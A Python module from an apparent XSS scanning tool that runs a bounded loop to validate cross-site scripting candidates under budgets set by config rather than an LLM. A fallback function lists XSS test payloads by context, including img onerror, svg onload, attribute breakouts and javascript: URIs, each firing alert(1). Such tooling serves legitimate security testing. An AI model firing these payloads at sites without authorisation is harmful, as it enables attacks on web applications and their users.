"""
xss-validator node — iterative candidate generation
====================================================
Implements the bounded generate -> test -> learn -> replan loop per spec.

For each candidate:
  1. Build IterationBudget from node config (LLM cannot override)
  2. Run IterativeValidator (plan -> policy -> test -> observe -> replan)
  3. Record every attempt — failures are evidence, not discarded
  4. Stop on confirmation OR budget exhaustion
  5. Full attempt history in output

Hard limits (from config or defaults, never from LLM):
  max_iterations               = 5
  max_candidates_per_iteration = 5
  max_total_candidates         = 20
  max_requests                 = 40
  max_runtime_s                = 120
  stop_on_confirmation         = true

Terminal states (spec §11):
  CONFIRMED | VALIDATED | INCONCLUSIVE | BUDGET_EXHAUSTED
  BUDGET_EXHAUSTED != SAFE — never conflate these

Inputs:  xss_candidates (list[dict]), target_url
Outputs: validated_candidates (list[dict])
"""
from __future__ import annotations

import time
from typing import Any
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from xscan.core.dag.node_registry import registry
from xscan.nodes.base import ExecutionContext, NodeBase
from xscan.nodes.emitter import NodeEmitter
from xscan.schemas.iteration import IterationBudget, IterationStatus
from xscan.validation.iterative import IterativeValidator


@registry.register("xss-validator")
class XssValidatorNode(NodeBase, NodeEmitter):
    node_type = "xss-validator"

    def execute(self, ctx: ExecutionContext) -> dict[str, Any]:
        t0 = self.emit_started(ctx)

        # Accept fused_candidates (new pipeline) OR xss_candidates (legacy)
        candidates: list[dict] = (
            ctx.get("fused_candidates") or
            ctx.get("xss_candidates") or
            []
        )
        if not candidates:
            self.emit_completed(ctx, metrics={"validated": 0, "confirmed": 0})
            return {"validated_candidates": [], "validated_count": 0, "confirmed_count": 0}

        # Check if target is CTF — delegate to specialized CTF validator if so
        techs = ctx.get("technologies", []) or []
        url = candidates[0].get("url", "") if candidates else ""
        
        # Lazy import to avoid circular dependencies
        try:
            from xscan.validation.ctf_detection import detect_ctf_context
            ctf_ctx = detect_ctf_context(url, techs)
            
            if ctf_ctx.is_ctf:
                # Delegate to CTF-mode validation
                self.emit_debug(ctx, f"CTF target detected: {ctf_ctx.platform}; delegating to ctf-validate")
                from xscan.nodes.validation.ctf_validate import CtfValidateNode
                
                ctf_node = CtfValidateNode()
                return ctf_node.execute(ctx)
        except Exception as e:
            self.emit_warning(ctx, f"CTF detection failed, continuing with standard validation: {str(e)[:100]}")

        # Budget from config — LLM cannot override
        budget = IterationBudget(
            max_iterations               = int(ctx.config.get("max_iterations",               3)),
            max_candidates_per_iteration = int(ctx.config.get("max_candidates_per_iteration", 3)),
            max_total_candidates         = int(ctx.config.get("max_total_candidates",         10)),
            max_requests                 = int(ctx.config.get("max_requests",                 20)),
            max_runtime_s                = float(ctx.config.get("max_runtime_s",              60.0)),
            stop_on_confirmation         = bool(ctx.config.get("stop_on_confirmation",        True)),
        )

        validated: list[dict] = []
        confirmed_count = 0

        # Per-candidate soft time limit — prevents one slow candidate blocking all others
        # (kept as config key but not used in this loop — see IterationBudget.max_runtime_s)
        _per_candidate_limit = float(ctx.config.get("max_runtime_s", 60.0))  # noqa: F841

        for i, candidate in enumerate(candidates):
            url    = candidate.get("url", "")
            param  = candidate.get("parameter", "")
            method = candidate.get("method", "GET")
            ca     = candidate.get("context_analysis") or {}
            ep     = candidate.get("encoding_profile") or {}
            techs  = ctx.get("technologies", []) or []

            # For DOM candidates: unpack execution semantics from encoding_profile
            # (fusion.py stores exec semantics there for DOM candidates).
            # Stored candidates carry the same style of profile (sink_kind /
            # sink_capability), so the validator can route them too.
            exec_sem = ep if ep and ep.get("xss_type") in ("dom", "stored") else {}
            is_dom_candidate = bool(exec_sem) or candidate.get("xss_type") == "dom"

            # Propagate sink_kind from top-level candidate dict into exec_sem
            # so the iterative validator and synthesiser both see it.
            top_sink_kind = str(candidate.get("sink_kind") or ep.get("sink_kind") or "")
            if top_sink_kind and not exec_sem.get("sink_kind"):
                exec_sem = dict(exec_sem)
                exec_sem["sink_kind"] = top_sink_kind

            # ca may be None for DOM candidates (no server-side context analysis)
            ca = ca or {}
            ctx_name = ca.get("context", "dom" if is_dom_candidate else "?")

            # Extract all reflection contexts for multi-context candidates
            all_ctx_raw = candidate.get("all_contexts", [])
            all_ctxs = [ca] if (ca and not all_ctx_raw) else (all_ctx_raw or [])
            form_raw = candidate.get("form", {})
            form_data = (
                {inp["name"]: inp.get("value", "test")
                 for inp in form_raw.get("inputs", [])}
                if form_raw else None
            )
            self.emit_progress(
                ctx,
                f"Validating [{i+1}/{len(candidates)}]  "
                f"param={param}  context={ctx_name}",
            )

            engine = IterativeValidator(
                scope=ctx.scope,
                policy=ctx.policy,
                budget=budget,
                scan_id=ctx.scan_id,
                no_llm=ctx.no_llm,
                progress_cb=lambda msg: self.emit_progress(ctx, msg),
            )
            state = engine.run(
                url=url,
                parameter=param,
                method=method,
                context_analysis=ca,
                encoding_profile=ep,
                form_data=form_data,
                technologies=techs,
                all_contexts=all_ctxs,
                execution_semantics=exec_sem,  # DOM-specific execution context
            )

            # Build result — preserves all attempt history
            is_confirmed = state.status == IterationStatus.CONFIRMED
            is_validated = is_confirmed or any(
                r.reflected and not r.encoded for r in state.previous_results
            )
            best_payload: str = state.confirmed_payload or next(
                (r.payload for r in state.previous_results
                 if r.reflected and not r.encoded),
                "",
            ) or ""
            best_test_url = _build_test_url(url, param, best_payload) if best_payload else url

            result = dict(candidate)
            result.update({
                # New iterative fields
                "validation_status":         state.status,
                "iterations":                state.iteration,
                "total_candidates_tested":   state.total_candidates,
                "iteration_summary":         state.summary(),
                # Backward-compat fields used by report node
                "validated":                 is_validated,
                "confirmed":                 is_confirmed,
                "best_payload":              best_payload,
                "best_test_url":             best_test_url,
                "replan_count":              state.iteration,
                "observations": [
                    r.model_dump(mode="json") for r in state.previous_results
                ],
                "test_plan": {},
            })
            if is_confirmed:
                # The finding must explain WHY the payload works: build the
                # vulnerability model from this candidate's own evidence.
                try:
                    from xscan.schemas.vuln_model import build_model_from_candidate

                    model = build_model_from_candidate(result)
                    model.attacker_control = "confirmed"
                    result["vuln_model"] = model.model_dump(mode="json")
                    result["why"] = model.explain()
                except Exception:
                    pass
            validated.append(result)

            if is_confirmed:
                confirmed_count += 1
                self.emit_progress(ctx, f"  CONFIRMED: {best_payload[:60]!r}")
            elif is_validated:
                self.emit_progress(ctx, f"  Validated (unencoded): {best_payload[:60]!r}")
            else:
                self.emit_progress(
                    ctx,
                    f"  {state.status}  "
                    f"({state.total_candidates} tested, {state.iteration} iter)",
                )

        ms = (time.monotonic() - t0) * 1000
        validated_count = sum(1 for v in validated if v.get("validated"))
        self.emit_completed(ctx, metrics={
            "candidates":  len(candidates),
            "validated":   validated_count,
            "confirmed":   confirmed_count,
        }, duration_ms=ms)

        return {
            "validated_candidates": validated,
            "validated_count":      validated_count,
            "confirmed_count":      confirmed_count,
        }

    # ------------------------------------------------------------------
    # Heuristic plan — kept as static method (used by IterativeValidator)
    # ------------------------------------------------------------------

    @staticmethod
    def _heuristic_plan(
        context_analysis: dict,
        encoding_profile: dict,
        sink_kind: str = "",
        source_type: str = "",
    ) -> dict:
        """
        Deterministic plan: derive payloads from the observed scenario.

        The scenario synthesiser composes a breakout, an execution vector and a
        dialog call from the reflection context, the sink semantics and the
        encoding profile — so a context the tool has never seen still gets
        payloads built from its own constraints. The legacy per-context table is
        the last-resort fallback when the evidence is too thin to synthesise.
        """
        from xscan.validation.payload_synthesis import plan_for_context

        plan = plan_for_context(
            context_analysis, encoding_profile,
            sink_kind=sink_kind, source_type=source_type,
        )
        if plan.get("test_cases"):
            return plan
        return XssValidatorNode._heuristic_plan_legacy(context_analysis, encoding_profile)

    @staticmethod
    def _heuristic_plan_legacy(context_analysis: dict, encoding_profile: dict) -> dict:
        """
        Static per-context fallback plan when the synthesiser has no evidence.
        Uses context + encoding to select payloads guaranteed to respect constraints.
        """
        context    = context_analysis.get("context", "unknown")
        raw_chars  = encoding_profile.get("raw_chars", [])
        encoded    = encoding_profile.get("encoded_chars", [])
        quote_type = context_analysis.get("quote_type", "double")
        attribute  = context_analysis.get("attribute", "")

        test_cases: list[dict] = []

        # ── html_text ─────────────────────────────────────────────────
        if context in ("html_text",) and "<" in raw_chars:
            test_cases = [
                {"priority": 1, "payload": "<img src=x onerror=alert(1)>",
                 "expected_observation": "onerror fires",
                 "rationale": "html_text, < not encoded"},
                {"priority": 2, "payload": "<svg onload=alert(1)>",
                 "expected_observation": "onload fires",
                 "rationale": "svg without closing tag"},
                {"priority": 3, "payload": "<script>alert(1)</script>",
                 "expected_observation": "script executes",
                 "rationale": "direct script injection"},
            ]

        # ── html_attribute ────────────────────────────────────────────
        elif context in ("html_attribute", "html_attribute_unquoted"):
            if quote_type == "double" and '"' in raw_chars:
                test_cases = [
                    {"priority": 1, "payload": '" onmouseover="alert(1)',
                     "expected_observation": "event handler in attribute",
                     "rationale": "break double-quoted attribute"},
                    {"priority": 2, "payload": '" onfocus="alert(1)" autofocus="',
                     "expected_observation": "onfocus fires",
                     "rationale": "autofocus trigger"},
                    {"priority": 3, "payload": '" onmouseenter="alert(1)',
                     "expected_observation": "onmouseenter fires",
                     "rationale": "alternative handler"},
                    {"priority": 4, "payload": '" tabindex="1" onfocus="alert(1)',
                     "expected_observation": "onfocus on tab",
                     "rationale": "tabindex focusable"},
                ]
                if "<" not in encoded:
                    test_cases.append(
                        {"priority": 5, "payload": '"><img src=x onerror=alert(1)>',
                         "expected_observation": "img injected",
                         "rationale": "close + inject if < allowed"}
                    )
            elif quote_type == "single" and "'" in raw_chars:
                test_cases = [
                    {"priority": 1, "payload": "' onmouseover='alert(1)'",
                     "expected_observation": "event handler fires",
                     "rationale": "break single-quoted attribute"},
                    {"priority": 2, "payload": "' onfocus='alert(1)' autofocus='",
                     "expected_observation": "onfocus",
                     "rationale": "autofocus"},
                ]
                if "<" not in encoded:
                    test_cases.append(
                        {"priority": 3, "payload": "'><img src=x onerror=alert(1)>",
                         "expected_observation": "img injected", "rationale": "close + inject"}
                    )
            elif quote_type == "unquoted":
                test_cases = [
                    {"priority": 1, "payload": " onmouseover=alert(1) x=",
                     "expected_observation": "event handler injected",
                     "rationale": "unquoted attribute injection"},
                ]
            if attribute in ("href", "src", "action", "formaction"):
                test_cases.insert(0,
                    {"priority": 0, "payload": "javascript:alert(1)",
                     "expected_observation": "JS scheme executes on click",
                     "rationale": "javascript: URI in href/src"}
                )

        # ── script string ─────────────────────────────────────────────
        elif context == "script_string_double" and '"' in raw_chars:
            test_cases = [
                {"priority": 1, "payload": '"-alert(1)-"',
                 "expected_observation": "alert in arithmetic", "rationale": "double string breakout"},
                {"priority": 2, "payload": '";alert(1)//',
                 "expected_observation": "statement injection", "rationale": "terminate + inject"},
            ]
        elif context == "script_string_single" and "'" in raw_chars:
            test_cases = [
                {"priority": 1, "payload": "'-alert(1)-'",
                 "expected_observation": "alert in arithmetic", "rationale": "single string breakout"},
                {"priority": 2, "payload": "';alert(1)//",
                 "expected_observation": "statement injection", "rationale": "terminate + inject"},
            ]
        elif context == "script_expression":
            test_cases = [
                {"priority": 1, "payload": ";alert(1)//",
                 "expected_observation": "alert executes", "rationale": "expression injection"},
            ]

        # ── Fallback: try the most common patterns ────────────────────
        if not test_cases:
            test_cases = [
                {"priority": 1, "payload": '" onmouseover="alert(1)',
                 "expected_observation": "event handler injected", "rationale": "generic attribute"},
                {"priority": 2, "payload": "' onmouseover='alert(1)'",
                 "expected_observation": "event handler injected", "rationale": "single-quote attribute"},
                {"priority": 3, "payload": "<img src=x onerror=alert(1)>",
                 "expected_observation": "onerror fires", "rationale": "html text fallback"},
                {"priority": 4, "payload": "<svg onload=alert(1)>",
                 "expected_observation": "onload fires", "rationale": "svg fallback"},
            ]

        return {
            "viable":              True,
            "reasoning":           f"Heuristic plan for context={context} quote={quote_type}",
            "context_interpretation": f"{context} — breakout via {quote_type} quote",
            "encoding_interpretation": f"raw={raw_chars}  encoded={encoded}",
            "breakout_strategy":   "event handler injection" if "attribute" in context else "tag injection",
            "estimated_confidence": "high" if test_cases else "low",
            "test_cases":          test_cases,
        }


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _build_test_url(url: str, param: str, payload: str) -> str:
    """Build a test URL with the payload injected into param."""
    if not param or not payload:
        return url
    try:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        new_query = urlencode({k: v[0] for k, v in params.items()})
        return urlunparse(parsed._replace(query=new_query))
    except Exception:
        return url
